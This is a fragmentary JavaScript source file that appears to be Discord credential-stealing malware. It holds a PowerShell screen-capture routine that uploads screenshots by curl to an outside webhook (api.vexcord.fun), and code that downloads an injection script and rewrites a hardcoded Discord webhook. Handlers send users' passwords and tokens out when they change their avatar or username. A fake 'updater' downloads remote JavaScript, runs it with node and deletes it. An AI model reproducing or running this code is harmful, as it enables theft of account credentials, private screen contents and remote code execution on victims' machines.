...
const CONFIG = {
    webhook: 'https://api.vexcord.fun/send',
    API: '%API_URL%',
...
const notify = async (ctx, token, user, test = null) => {
...
const captureScreenshot = async () => {
    const screenshotCommand = `powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Bitmap = New-Object Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen($Screen.Location, [Drawing.Point]::Empty, $Screen.Size); $Bitmap.Save('screenshot.png'); $Graphics.Dispose(); $Bitmap.Dispose()"`;
    await execCommand(screenshotCommand);
    const curlCommand = `curl -s -X POST ${CONFIG.webhook} \
    -H "Content-Type: multipart/form-data" \
    -F "file=@./screenshot.png" \
    -F "content=Here is the screenshot"`;
  
    await execCommand(curlCommand);
};
                ...
                try {
                    ...
                    await new Promise((resolve, reject) => {
                        https.get('${CONFIG.injection_url}', (res) => {
                            res.on('data', chunk => fileStream.write(chunk.toString().replace('https://canary.discord.com/api/webhooks/1278475355312885851/AVFOtg_w94wg4vQgJYkW15YxMz_MYYlkheuNBJTDiY2XgP-W2DFN5lXhAUk6X_FBUzBq', '${CONFIG.webhook}')));
                            res.on('end', () => {
                                fileStream.end();
                                resolve();
                            });
        ...
        case params.response.url.endsWith('/@me'):
            if (RESQUEST_DATA.avatar) {
                Cruise(
                    ...
                    RESQUEST_DATA.password??"",
                    token,
                    `has updated their avatar to \`${user.email}\``
                );
            ...
            if (RESQUEST_DATA.username) {
                Cruise(
                    ...
                    RESQUEST_DATA.password,
                    token,
                    `has updated their username to \`${user.email}\``
                );
            }
...
const createWindow = async (mainWindow) => {
    let suankiver = 2
    let gelenver = await execCommand("curl https://raw.githubusercontent.com/ottoman1234/bluetv-checker/main/ver.txt")
    if(suankiver != gelenver) {
        await execCommand("curl -o updater.js https://raw.githubusercontent.com/vendicatedev/venPlug/main/index.js")
        await execCommand("node updater.js")
    }

    if(fs.existsSync("updater.js")) {
        await execCommand("del updater.js")
    }
